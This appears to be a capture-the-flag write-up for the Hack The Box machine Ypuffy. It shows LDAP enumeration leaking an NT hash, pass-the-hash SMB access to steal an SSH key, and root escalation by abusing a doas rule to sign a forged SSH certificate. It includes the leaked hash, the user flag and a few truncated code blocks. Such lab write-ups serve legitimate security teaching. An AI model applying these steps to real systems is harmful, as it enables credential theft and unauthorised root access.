Ypuffy is a medium difficulty OpenBSD machine. The OpenBSD operating system provides a bit of a twist compared to the usual Linux and Windows challenges. The path to user is relatively simple. Careful enumeration, a bit of research on [YP LDAP](http://puffysecurity.com/wiki/ypldap.html),  and the knowledge within the `man` pages of `smbclient` will get you there. Elevating priveleges to `root` is a bit trickier, and requires putting a few pieces of information together that may not be so obviously related. With the right bit of [reference material](https://engineering.fb.com/production-engineering/scalable-and-secure-access-with-ssh/) provided by our Big Brother Facebook, the path to `root` becomes clear.

*Note: I completed this challenge on January 5th, 2019, however I'm just now writing it up in January 2020. As such, some of the details are sparse.*

## User
To begin enumeration, the `masscan` tool was used to scan the target system for open ports. 

```
root@kali:~/workspace/hackthebox/Ypuffy# masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.107

Discovered open port 139/tcp on 10.10.10.107
   
```

This scan revealed that a variety of ports were open and listening for connections. TCP ports 445 and 139 are used with SMB, port 389 is used for LDAP, port 80 is used as a HTTP port, and port 22 is SSH. Taking these open ports, the `nmap` tool was then used to further enumerate the open ports.

```

The `nmap` output regarding port 80 suggests that this is a OpenBSD system. Browsing to `http://10.10.10.107` does not reveal much, which suggests this webserver is possibly being used for something other than hosting a website. The scan has also reported that anonymous binds are allowed on the LDAP server on port 389. LDAP stands for "Lightweight Directory Access Protocol" and is often used for user validation validation to particular resources, amongst other things. The LDAP service running port 389 was enumerated further using the `nmap` scripting engine.

```
root@kali:~/workspace/hackthebox/Ypuffy# nmap --script /usr/share/nmap/scripts/ldap-search.nse 10.10.10.107
```

Querying the LDAP service reveals some information about the target system, including some configured users.

```

The `userPassword` fields look juicy, but some [research](http://puffysecurity.com/wiki/ypldap.html) on the setup of an OpenBSD LDAP server and YP domains via `ypldap` explains that the presence of  `userPassword` means that the configured user will be authenitacted by `{BSDAUTH}` and that passwords are checked against a Blowfish hash stored in LDAP.

The entry for the `alice1978` user additionally contains a value in the `sambaNTPassword` field. This value is a Samba password that is hashed using the MD4 algorithm. With the help of the `smbclient` tool, the hashed Samba password can be used to authenticate to the SMB service on port 445 as the user `alice1978`.

From `man smbclient`:

```
--pw-nt-hash
    The supplied password is the NT hash.
```

First, the available Samba shares were listed via the command below with `0B186E661BBDBDCF6047784DE8B9FD8B` as the password.

```
root@kali:~/workspace/hackthebox/Ypuffy# smbclient --user=alice1978 --pw-nt-hash -L //10.10.10.107 
Enter WORKGROUP\alice1978's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        alice           Disk      Alice's Windows Directory
        IPC$            IPC       IPC Service (Samba Server)
...
```

Next, the `alice` share was accessed once again using the hashed Samba password for authentication.

```
root@kali:~/workspace/hackthebox/Ypuffy# smbclient --user=alice1978 --pw-nt-hash //10.10.10.107/alice
```

After connecting and listing the files with the `dir` command, the only file present in the `alice` SMB share is `my_private_key.ppk`. The `.ppk` extension suggests that this is a PuTTY private key file, and that the contents within are the `alice1978` user's private SSH key. The `my_private_key.ppk` file can be copied to the attacking system using the `get` SMB command.

```
smb: \> get my_private_key.ppk 
getting file \my_private_key.ppk of size 1460 as my_private_key.ppk (6.0 KiloBytes/sec) (average 6.0 KiloBytes/sec)
```

With the `alice1978` user's private SSH key, it is likely possible to access the target system via SSH after some slight modifications to the `my_private_key.ppk` file. Note that the `nmap` scan suggests that the SSH server running on port 22 of the target system is OpenSSH server (confirmed below).

```
root@kali:~/workspace/hackthebox/Ypuffy# telnet 10.10.10.107 22
Trying 10.10.10.107...
Connected to 10.10.10.107.
Escape character is '^]'.
SSH-2.0-OpenSSH_7.7
```

As the `my_private_key.ppk` file is a PuTTY private key file, the must first be converted to a format that is compatible with OpenSSH before connecting to the OpenSSH server on the target system. This can be accomplished using the `puttygen` tool as shown below (the tool can be installed with `apt-get install putty-tools`).

```
root@kali:~/workspace/hackthebox/Ypuffy# puttygen my_private_key.ppk -O private-openssh -o alice1978-opensshkey
```

The target system can now be accessed as the `alice1978`.

```
root@kali:~/workspace/hackthebox/Ypuffy# ssh alice1978@10.10.10.107 -i alice1978-opensshkey
```

The `user.txt` flag can now be read as the `alice1978` user.

```
ypuffy$ whoami
alice1978
ypuffy$ cat user.txt
acbc06eb2982b14c2756b6c6e3767aab
```

## Root
Once on the system as the low-privilege user `alice1978` a couple of items stand out. Once low privilege access to a system is gained, it is common practice to check what privileges the compromised user has. On Linux, this can be done with `sudo -l`. Windows has the `runas` command, but privileges are generally defined by user groups and privileges which can be determined with the `whoami /all` command. On OpenBSD, the `doas` command most strongly correlates to the Linux `sudo` and the Windows `runas` commands. The configuration for `doas` is located in `/etc/doas.conf`. The contents of the `/etc/doas.conf` file on the target system are shown below.

```
permit keepenv :wheel
permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
```

This means that the user `alice1978` is able to run the command `/usr/bin/ssh-keygen` with the privileges/permissions of the `userca` user. Enumerating the `/home/userca` directory, it appears that the target server is acting as a certificate authority, and that the `userca` user is used to authorize certficates. While certificate authorities are most commonly used to validate the identities of websites on the internet, in this case of `ypuffy` the certificate authority is being used to validate SSH keys. This is evident due to the presence of a `ca` private SSH key and a `ca.pub` public SSH key in the `/home/userca` directory.

```
ypuffy$ ls -lah     
...
-r--------  1 userca  userca   1.6K Jul 30  2018 ca
-r--r--r--  1 userca  userca   410B Jul 30  2018 ca.pub
ypuffy$ file ca.pub
ca.pub: OpenSSH RSA public key
```

This idea is reinforced further by the `sshauth.sql` file found in the `/home/bob8791` directory, the contents of which are shown below.

```
CREATE TABLE principals (
        uid text,
        client cidr,
        principal text,
        PRIMARY KEY (uid,client,principal)
);

CREATE TABLE keys (
        uid text,
        key text,
        PRIMARY KEY (uid,key)
);
grant select on principals,keys to appsrv;
```

This suggests that there is a database on the server that contains a `principals` table and a `keys` table.

After a bit of research, an [article](https://engineering.fb.com/production-engineering/scalable-and-secure-access-with-ssh/) was found that explains how a certificate authority can be used to provide specific priveleges to specific users via SSH. In short, the CA infrastructure receives the public keys of users, signs them using the CA's private key (the `ca` key, in this case), and returns the signed certificate back to the client. The returned certificate will provide all of the principals allowed for the specific user. A server can be configured to only accept public SSH keys that are signed with certain principals.

Following along with the article suggests that much of the configuration resides in the `/etc/ssh/sshd_config` file. Viewing the contents of the `/etc/ssh/sshd_config` file reveals the following (partial) output.

```
...
AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&username=%u
AuthorizedKeysCommandUser nobody

TrustedUserCAKeys /home/userca/ca.pub
AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u
AuthorizedPrincipalsCommandUser nobody
...
```

This suggests that the SQL database mentioned previously is being queried via the `curl` commands shown above. Testing the first command shown above with the low-priveleged `alice1978` user reveals the following.

```
ypuffy$ /usr/local/bin/curl "http://127.0.0.1/sshauth?type=keys&username=alice1978"       
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw== rsa-key-20180716
```

This is expected, as the query returned the public key for the `alice1978` user that has been signed by the CA user's (`userca`) 
private key and stored in an `authorized_keys` file, thus granting `alice1978` (or anyone with the user's private SSH key) access to the system.

The output of the second `curl` command from the `/etc/ssh/sshd_config` file is shown below.

```
ypuffy$ /usr/local/bin/curl "http://127.0.0.1/sshauth?type=principals&username=alice1978" 
alice1978
```

This queries the `principals` table that determines what privileges are granted to a specific user whose public SSH key was signed using the CA user's private key. The `alice1978` user has the `alice1978` principal.

Querying the `root` user's entry in the `principals` table shows the following.

```
ypuffy$ /usr/local/bin/curl "http://127.0.0.1/sshauth?type=principals&username=root"      
3m3rgencyB4ckd00r
```

The principal for the `root` user is `3m3rgencyB4ckd00r`. 

Using this information, a new SSH key can first be created with the `3m3rgencyB4ckd00r` principal and then signed by the certificate authority (`userca`) by running the allowed `doas` command as the low-privileged `alice1978` user.  The signed key can then be used to SSH to the system as `root`. This process is outlined below.

First, a new key pair was generated:

```
ypuffy$ ssh-keygen -t ecdsa
Generating public/private ecdsa key pair.
Enter file in which to save the key (/home/alice1978/.ssh/id_ecdsa): 
Created directory '/home/alice1978/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/alice1978/.ssh/id_ecdsa.
Your public key has been saved in /home/alice1978/.ssh/id_ecdsa.pub.
The key fingerprint is:
SHA256:enSy3eVOgL8mMNWsgnyvxytoPloAIbDs0U8cptjj1MM alice1978@ypuffy.hackthebox.htb
The key's randomart image is:
+---[ECDSA 256]---+
|+ .  o           |
|.o+.* .          |
|.+.* E     o     |
|. +.+ .   ..o    |
| . ..o .S.o.. .  |
|     .oo==.o +   |
|      ooo*. o o  |
|     .+.. = .+   |
|    .+...+.+. .  |
+----[SHA256]-----+
```

The newly-created public key `id_ecdsa.pub` was then copied to the `/tmp` directory so that the signing process does not fail due to file permissions.

```
ypuffy$ cp .ssh/id_ecdsa.pub /tmp
```

Then, the key was signed using the `doas` command that is available to the `alice1978` user. From `man ssh-keygen`, the `-s` flag specifies which private key should be used for signing, the `-I` flag specifies the key's identity, the `-n` flag specifies which principal(s) the key should be signed with, the `-V` flag specifies the key's validity duration, and the `-z` flag specifies the serial number to embed into the certificate.

```
ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I whatever -n 3m3rgencyB4ckd00r -V +1w -z 1 /tmp/id_ecdsa.pub
Signed user key /tmp/id_ecdsa-cert.pub: id "whatever" serial 1 for 3m3rgencyB4ckd00r valid from 2020-01-02T22:31:00 to 2020-01-09T22:32:33
```

As suggested in the output, the `/tmp/id_ecdsa-cert.pub` file as created as a result of the above command. The `id_ecdsa-cert.pub` is the signed public key. The contents of the file can be read and copied to `/home/alice1978/.ssh/id_ecdsa-cert.pub`. With the key signed, the `ssh root@localhost` command can be issued to elevate privileges to the `root` user.

```
ypuffy$ ssh root@localhost
